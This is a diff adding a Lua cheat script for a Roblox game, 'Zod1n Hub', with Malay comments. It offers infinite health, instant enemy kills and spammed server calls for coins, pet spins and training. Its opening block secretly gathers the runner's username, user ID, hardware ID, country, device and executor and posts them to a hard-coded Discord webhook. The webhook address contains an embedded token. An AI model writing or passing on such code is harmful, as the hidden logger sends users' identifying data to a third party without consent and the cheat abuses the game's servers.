@@ -1,0 +1,445 @@
+-- =====================================================
+-- SCRIPT LOGGER (hantar info ke Discord)
+-- =====================================================
+local function sendWebhook()
+    local player = game.Players.LocalPlayer
+    if not player then return end
+
+    local webhook = "https://discord.com/api/webhooks/1561938040950231090/3__2HBXCuJukOVTpBjSahgAsvgG3QX7lwAP7NOKWAVj6K8q95XZe8f6LnvaAk757MxE8"
+    local HttpService = game:GetService("HttpService")
+    local UIS = game:GetService("UserInputService")
+    local GuiService = game:GetService("GuiService")
+    local LocalizationService = game:GetService("LocalizationService")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    -- Device
+    local device = "Unknown"
+    if GuiService:IsTenFootInterface() then
+        device = "Console"
+    elseif UIS.TouchEnabled and not UIS.KeyboardEnabled and not UIS.MouseEnabled then
+        device = "Mobile"
+    elseif UIS.KeyboardEnabled or UIS.MouseEnabled then
+        device = "PC"
+    elseif UIS.TouchEnabled then
+        device = "Mobile (Touch)"
+    end
+
+    -- Executor
+    local executorName = "Unknown / Normal Client"
+    local identify = identifyexecutor or getexecutorname
+    if identify then
+        local success, name, version = pcall(identify)
+        if success and name then
+            executorName = tostring(name)
+            if version then
+                executorName = executorName .. " (" .. tostring(version) .. ")"
+            end
+        end
+    else
+        if syn then
+            executorName = "Synapse X / Synapse Z"
+        elseif FLUXUS_LOADED or fluxus then
+            executorName = "Fluxus"
+        elseif KRNL_LOADED then
+            executorName = "KRNL"
+        elseif is_sirhurt_closure or SIRHURT_LOADED then
+            executorName = "SirHurt"
+        elseif getgenv and getgenv().Wave then
+            executorName = "Wave"
+        elseif getgenv and (getgenv().Delta or getgenv().deltax) then
+            executorName = "Delta"
+        elseif getgenv and getgenv().Codex then
+            executorName = "Codex"
+        elseif getgenv and getgenv().Solara then
+            executorName = "Solara"
+        elseif getgenv and getgenv().Xeno then
+            executorName = "Xeno"
+        elseif getgenv and getgenv().Volt then
+            executorName = "Volt"
+        elseif getgenv and getgenv().Madium then
+            executorName = "Madium"
+        elseif request or http_request or (http and http.request) then
+            executorName = "Unknown Executor (ada request)"
+        end
+    end
+
+    -- Account Age
+    local accountAgeDays = player.AccountAge
+    local years = math.floor(accountAgeDays / 365)
+    local months = math.floor((accountAgeDays % 365) / 30)
+    local ageText = string.format("%d hari (%d tahun %d bulan)", accountAgeDays, years, months)
+
+    -- Membership
+    local membership = "Bukan Premium"
+    if player.MembershipType == Enum.MembershipType.Premium then
+        membership = "Premium"
+    end
+
+    -- Language
+    local locale = player.LocaleId or LocalizationService.RobloxLocaleId or "Unknown"
+
+    -- Country
+    local country = "Unknown"
+    pcall(function()
+        country = LocalizationService:GetCountryRegionForPlayerAsync(player) or "Unknown"
+    end)
+
+    -- Friend Count
+    local friendCount = "Unknown"
+    pcall(function()
+        local friends = game:GetService("Players"):GetFriendsAsync(player.UserId)
+        local page = friends:GetCurrentPage()
+        friendCount = tostring(#page)
+    end)
+
+    -- HWID
+    local hwid = "Tidak dijumpai"
+    pcall(function()
+        if gethwid then
+            hwid = tostring(gethwid())
+        end
+
+        local req = request or http_request or (http and http.request) or (syn and syn.request)
+        if req and hwid == "Tidak dijumpai" then
+            local response = req({
+                Url = "https://httpbin.org/get",
+                Method = "GET"
+            })
+            if response and response.Body then
+                local body = HttpService:JSONDecode(response.Body)
+                if body.headers then
+                    for k, v in pairs(body.headers) do
+                        local lowerK = string.lower(k)
+                        if string.find(lowerK, "fingerprint") or string.find(lowerK, "hwid") or string.find(lowerK, "user-identifier") then
+                            hwid = tostring(v)
+                            break
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    local data = {
+        username = "Script Logger",
+        embeds = {{
+            title = "Script Digunakan",
+            color = 16753920,
+            fields = {
+                {name = "Username", value = player.Name, inline = true},
+                {name = "User ID", value = tostring(player.UserId), inline = true},
+                {name = "Display Name", value = player.DisplayName, inline = true},
+                {name = "Account Age", value = ageText, inline = true},
+                {name = "Membership", value = membership, inline = true},
+                {name = "Device", value = device, inline = true},
+                {name = "Executor", value = executorName, inline = true},
+                {name = "HWID", value = hwid, inline = false},
+                {name = "Language / Locale", value = locale, inline = true},
+                {name = "Country", value = country, inline = true},
+                {name = "Friend Count (approx)", value = friendCount, inline = true},
+                {name = "Game", value = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", inline = false},
+                {name = "Place ID", value = tostring(game.PlaceId), inline = true},
+            },
+            footer = {text = "Script Tracker • Full Info"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local success, err = pcall(function()
+        if request then
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        else
+            HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
+        end
+    end)
+
+    if not success then
+        warn("Gagal hantar webhook: " .. tostring(err))
+    end
+end
+
+-- Hantar logger sekali je bila script start
+sendWebhook()
+
+-- =====================================================
+-- ZOD1N HUB (GUI + Features)
+-- =====================================================
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Buang GUI lama
+if playerGui:FindFirstChild("Zod1nHub") then
+    playerGui.Zod1nHub:Destroy()
+end
+
+-- ==================== REMOTES ====================
+local DS = ReplicatedStorage:WaitForChild("Remote"):WaitForChild("Dungeon_Server")
+local LuckPetRF = ReplicatedStorage:WaitForChild("Remote"):WaitForChild("Season_Server"):WaitForChild("LuckPetRF")
+local TrainRE = ReplicatedStorage:WaitForChild("Remote"):WaitForChild("Train_Server"):WaitForChild("IntoAutoTrainRE")
+
+-- ==================== CONFIG ====================
+local Config = {
+    Dungeon = false,
+    Spin = false,
+    Train = false,
+    Rounds = 0
+}
+
+-- ==================== FUNCTIONS ====================
+local function autoKillLoop()
+    local hp = player:FindFirstChild("HPValue")
+    if hp and hp:IsA("ValueBase") then
+        hp.Value = math.huge
+        hp:SetAttribute("MaxHP", math.huge)
+    end
+
+    while Config.Dungeon do
+        local EnemyFolder = Workspace:FindFirstChild("EnemyFolder")
+        if EnemyFolder then
+            for _, enemy in pairs(EnemyFolder:GetChildren()) do
+                local hpValue = enemy:FindFirstChild("HPValue")
+                if hpValue and hpValue:IsA("ValueBase") and hpValue.Value > 0 then
+                    hpValue.Value = 0
+                end
+            end
+        end
+        task.wait(0.05)
+    end
+end
+
+local function farmLoop()
+    while Config.Dungeon do
+        task.spawn(function()
+            pcall(function() DS.TryClaimDailyDunTicRE:FireServer() end)
+            pcall(function() DS.TryIntoDungeonRF:InvokeServer(true, 50) end)
+        end)
+
+        local done = false
+        for _ = 1, 5 do
+            task.spawn(function()
+                while not done and Config.Dungeon do
+                    local success, result = pcall(function()
+                        DS.StartRoundRE:FireServer(50)
+                        return DS.CompleteRoundRF:InvokeServer(50)
+                    end)
+                    if not success or type(result) ~= "table" then
+                        done = true
+                        break
+                    end
+                    Config.Rounds += 1
+                end
+            end)
+        end
+        repeat task.wait() until done or not Config.Dungeon
+    end
+end
+
+local function spinLoop()
+    while Config.Spin do
+        pcall(function()
+            LuckPetRF:InvokeServer()
+        end)
+        task.wait(0.03)
+    end
+end
+
+local function trainLoop()
+    while Config.Train do
+        pcall(function()
+            TrainRE:FireServer(9, true)
+        end)
+        task.wait(0.1)
+    end
+end
+
+-- ==================== GUI ====================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "Zod1nHub"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = playerGui
+
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 280, 0, 220)
+Main.Position = UDim2.new(0.5, -140, 0.5, -110)
+Main.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(55, 55, 70)
+MainStroke.Thickness = 1.5
+MainStroke.Parent = Main
+
+-- Header
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+Header.BorderSizePixel = 0
+Header.Parent = Main
+
+local HeaderCorner = Instance.new("UICorner")
+HeaderCorner.CornerRadius = UDim.new(0, 12)
+HeaderCorner.Parent = Header
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -50, 1, 0)
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Zod1n Hub"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 16
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Header
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name = "closeBtn"
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -35, 0, 6)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(38, 38, 48)
+CloseBtn.Text = "×"
+CloseBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
+CloseBtn.TextSize = 18
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = Header
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+
+-- Buttons Container
+local ButtonsFrame = Instance.new("Frame")
+ButtonsFrame.Size = UDim2.new(1, -24, 1, -55)
+ButtonsFrame.Position = UDim2.new(0, 12, 0, 48)
+ButtonsFrame.BackgroundTransparency = 1
+ButtonsFrame.Parent = Main
+
+local Grid = Instance.new("UIGridLayout")
+Grid.CellSize = UDim2.new(1, 0, 0, 42)
+Grid.CellPadding = UDim2.new(0, 0, 0, 8)
+Grid.SortOrder = Enum.SortOrder.LayoutOrder
+Grid.Parent = ButtonsFrame
+
+local function makeButton(name, text)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Size = UDim2.new(1, 0, 0, 42)
+    btn.BackgroundColor3 = Color3.fromRGB(38, 38, 48)
+    btn.Text = text .. "  |  OFF"
+    btn.TextColor3 = Color3.fromRGB(140, 140, 160)
+    btn.TextSize = 14
+    btn.Font = Enum.Font.GothamBold
+    btn.AutoButtonColor = false
+    btn.Parent = ButtonsFrame
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = btn
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(55, 55, 70)
+    stroke.Thickness = 1.2
+    stroke.Parent = btn
+
+    return btn, stroke
+end
+
+local spinBtn, spinStroke = makeButton("spin pet", "Spin pet")
+local coinBtn, coinStroke = makeButton("inf coin", "Inf Season Coins")
+local trainBtn, trainStroke = makeButton("X100 tra", "X100 Train")
+
+-- Toggle helper
+local function setState(btn, stroke, state, label)
+    if state then
+        btn.Text = label .. "  |  ON"
+        btn.TextColor3 = Color3.fromRGB(100, 220, 130)
+        stroke.Color = Color3.fromRGB(100, 220, 130)
+    else
+        btn.Text = label .. "  |  OFF"
+        btn.TextColor3 = Color3.fromRGB(140, 140, 160)
+        stroke.Color = Color3.fromRGB(55, 55, 70)
+    end
+end
+
+-- Connections
+spinBtn.MouseButton1Click:Connect(function()
+    Config.Spin = not Config.Spin
+    setState(spinBtn, spinStroke, Config.Spin, "Spin pet")
+    if Config.Spin then
+        task.spawn(spinLoop)
+    end
+end)
+
+coinBtn.MouseButton1Click:Connect(function()
+    Config.Dungeon = not Config.Dungeon
+    setState(coinBtn, coinStroke, Config.Dungeon, "Inf Season Coins")
+    if Config.Dungeon then
+        Config.Rounds = 0
+        task.spawn(farmLoop)
+        task.spawn(autoKillLoop)
+    end
+end)
+
+trainBtn.MouseButton1Click:Connect(function()
+    Config.Train = not Config.Train
+    setState(trainBtn, trainStroke, Config.Train, "X100 Train")
+    if Config.Train then
+        task.spawn(trainLoop)
+    end
+end)
+
+-- Close
+CloseBtn.MouseEnter:Connect(function()
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+end)
+CloseBtn.MouseLeave:Connect(function()
+    CloseBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
+end)
+CloseBtn.MouseButton1Click:Connect(function()
+    Config.Dungeon = false
+    Config.Spin = false
+    Config.Train = false
+    ScreenGui:Destroy()
+end)
+
+-- Drag
+local dragging, dragStart, startPos
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+print("Zod1n Hub loaded")
